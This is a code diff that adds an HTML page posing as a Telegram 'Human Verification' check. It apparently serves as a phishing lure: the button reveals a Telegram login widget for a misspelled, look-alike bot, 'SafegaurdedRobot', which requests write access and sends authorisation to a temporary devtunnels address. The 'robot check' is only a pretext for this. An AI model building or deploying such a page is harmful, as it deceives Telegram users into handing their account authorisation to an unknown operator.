@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 20vh;
+            background-color: #17212b;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        button {
+            background-color: #3b7357;
+            color: white;
+            border: none;
+            padding: 10px 40px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        button:hover {
+            background-color: #21867a;
+        }
+        #telegramLogin {
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Human Verification</h1>
+        <p>Click below to be checked for robot tendencies</p>
+        <button id="verifyButton">Click here</button>
+
+        <!-- Telegram Login Widget (Initially Hidden) -->
+        <div id="telegramLogin">
+            <script async src="https://telegram.org/js/telegram-widget.js"
+                    data-telegram-login="SafegaurdedRobot"
+                    data-size="large"
+                    data-auth-url="https://xt185mll-3000.use.devtunnels.ms/auth"
+                    data-request-access="write">
+            </script>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("verifyButton").addEventListener("click", function() {
+            document.getElementById("telegramLogin").style.display = "block"; // Show widget
+        });
+    
+        function closeApp() {
+            setTimeout(() => { window.close(); }, 3000); // Close app after 3 seconds
+        }
+    </script>
+</body>
+</html>
